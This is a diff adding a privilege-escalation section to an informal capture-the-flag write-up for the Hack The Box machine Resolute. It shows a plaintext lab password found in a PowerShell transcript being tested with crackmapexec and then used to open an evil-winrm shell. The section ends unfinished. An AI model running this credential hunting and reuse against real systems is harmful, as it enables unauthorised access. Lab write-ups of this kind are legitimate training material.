@@ -173,3 +173,33 @@ SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\melanie:W
 ```
 - and we got a valid login with user melanie
 - i did nmap again and port 5985 is opne so we try evilwinrm and we got a shell and the userflag
+# Priv Esc
+- i uploaded winpeas and run it and found no useful info 
+- I went to the filesystem root 
+- In PowerShell, ls is an alias for Get-ChildItem or gci. On windows, it’s often a good idea to run that with -force, kind of like running ls -a
+- so in the filesystem i ran ls -force and found PSTranscript Directoty which seemd intersting after couple of directories we found a txt file
+```
+*Evil-WinRM* PS C:\PSTranscripts\20191203> cat PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
+```
+-there is a line which seemed pretty cool with creds on it
+```
+value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+```
+- so we have ryan and pass Serv3r4Admin4cc123!
+- check the creds with crackmapexec
+```
+crackmapexec smb 10.10.10.169 -u ryan -p 'Serv3r4Admin4cc123!'
+crackmapexec winrm 10.10.10.169 -u ryan -p 'Serv3r4Admin4cc123!'
+```
+- and we got pwnd
+- i evilwinrm to ryan and got a shell
+- after playing around with pathes i found  a note on the desktop
+```
+*Evil-WinRM* PS C:\Users\ryan\desktop> cat note.txt
+Email to team:
+
+- due to change freeze, any system changes (apart from those to the administrator account) will be automaticallithin 1 minute
+```
+- 
+
+
